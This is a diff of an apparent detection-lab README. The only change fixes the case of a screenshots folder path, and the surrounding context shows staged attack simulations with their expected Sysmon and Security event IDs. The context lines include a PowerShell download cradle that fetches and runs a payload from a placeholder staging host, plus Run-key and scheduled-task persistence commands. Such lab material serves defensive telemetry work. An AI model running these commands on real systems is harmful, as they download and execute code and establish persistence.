@@ -33,7 +33,7 @@ IEX (New-Object Net.WebClient).DownloadString('http://<staging-host>/payload.ps1
 .\stage1-download-cradle.ps1
 ```
 
-<img src="./screenshots/stage1-download-cradle-executed.png" alt="Stage 1 Execution Output" width="850" style="max-width:100%; height:auto; display:block; margin:10px 0; border:1px solid #ddd; border-radius:4px;"/>
+<img src="./Screenshots/stage1-download-cradle-executed.png" alt="Stage 1 Execution Output" width="850" style="max-width:100%; height:auto; display:block; margin:10px 0; border:1px solid #ddd; border-radius:4px;"/>
 
 **Expected telemetry:**
 - Sysmon Event ID 1 (process creation) with `CommandLine` containing `DownloadString` and `IEX`
@@ -57,7 +57,7 @@ Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
 .\stage2-persistence-runkey.ps1
 ```
 
-<img src="./screenshots/stage2-registry-persistence-executed.png" alt="Stage 2 Execution Output" width="850" style="max-width:100%; height:auto; display:block; margin:10px 0; border:1px solid #ddd; border-radius:4px;"/>
+<img src="./Screenshots/stage2-registry-persistence-executed.png" alt="Stage 2 Execution Output" width="850" style="max-width:100%; height:auto; display:block; margin:10px 0; border:1px solid #ddd; border-radius:4px;"/>
 
 **Expected telemetry:**
 - Sysmon Event ID 13 (registry value set), with `TargetObject` containing `CurrentVersion\Run`
@@ -80,7 +80,7 @@ schtasks /create /tn "LabPersistenceTask" /tr "powershell.exe -WindowStyle Hidde
 .\stage3-persistence-scheduledtask.ps1
 ```
 
-<img src="./screenshots/stage3-scheduledtask-persistence-executed.png" alt="Stage 3 Execution Output" width="850" style="max-width:100%; height:auto; display:block; margin:10px 0; border:1px solid #ddd; border-radius:4px;"/>
+<img src="./Screenshots/stage3-scheduledtask-persistence-executed.png" alt="Stage 3 Execution Output" width="850" style="max-width:100%; height:auto; display:block; margin:10px 0; border:1px solid #ddd; border-radius:4px;"/>
 
 **Expected telemetry:**
 - Security Event ID 4698 (scheduled task created), which requires the `Other Object Access Events` audit subcategory to be explicitly enabled (see Phase 1) — this is not enabled by default and produces no events until configured
